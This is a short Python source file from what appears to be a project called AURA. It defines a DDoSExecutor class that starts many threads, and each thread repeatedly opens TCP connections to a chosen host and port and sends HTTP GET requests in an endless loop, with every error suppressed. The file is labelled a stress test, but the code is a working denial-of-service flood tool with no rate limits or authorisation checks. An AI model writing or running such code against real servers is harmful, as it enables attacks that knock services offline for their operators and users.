# AURA/core/stress_test.py
import socket
import threading

class DDoSExecutor:
    def __init__(self, target, port, threads_count):
        self.target = target
        self.port = port
        self.threads_count = threads_count
        self.is_running = False
        self.threads = []

    def _attack_logic(self):
        # Pacote HTTP Simples
        payload = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n".encode('ascii')
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target, self.port))
                s.send(payload)
                s.close()
            except:
                pass

    def start(self):
        self.is_running = True
        for _ in range(self.threads_count):
            t = threading.Thread(target=self._attack_logic, daemon=True)
            t.start()
            self.threads.append(t)

    def stop(self):
        self.is_running = False
        self.threads.clear()
